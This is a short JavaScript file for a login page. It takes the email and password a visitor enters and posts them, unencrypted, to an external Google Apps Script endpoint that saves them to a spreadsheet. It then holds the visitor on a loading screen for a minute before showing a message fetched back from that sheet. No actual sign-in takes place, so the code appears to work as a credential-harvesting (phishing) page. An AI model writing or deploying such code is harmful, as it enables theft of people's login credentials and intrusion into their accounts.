const API_URL = "https://script.google.com/macros/s/AKfycbxZLsOEVVtkzqEnGUsyOGLYOKyq4iJ6_87u0U91FB7jJ0MPZIQecsQHDNP3klPlwQJZ/exec";

// STEP 1: LOGIN + SAVE DATA
async function login() {
  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();

  if (!email || !password) {
    alert("Please fill all fields");
    return;
  }

  try {
    await fetch(API_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ email, password })
    });

    showPage("loadingPage");

    // wait 1 minute
    setTimeout(loadSheetData, 60000);

  } catch (err) {
    console.error(err);
    alert("Error saving data");
  }
}


// STEP 2: LOAD DATA FROM SHEET
async function loadSheetData() {
  try {
    const res = await fetch(API_URL);
    const data = await res.json();

    document.getElementById("msg").innerText = data.message;

    showPage("resultPage");

  } catch (err) {
    alert("Error loading sheet data");
  }
}


// PAGE SWITCH
function showPage(pageId) {
  document.querySelectorAll(".page").forEach(p => p.classList.remove("active"));
  document.getElementById(pageId).classList.add("active");
}
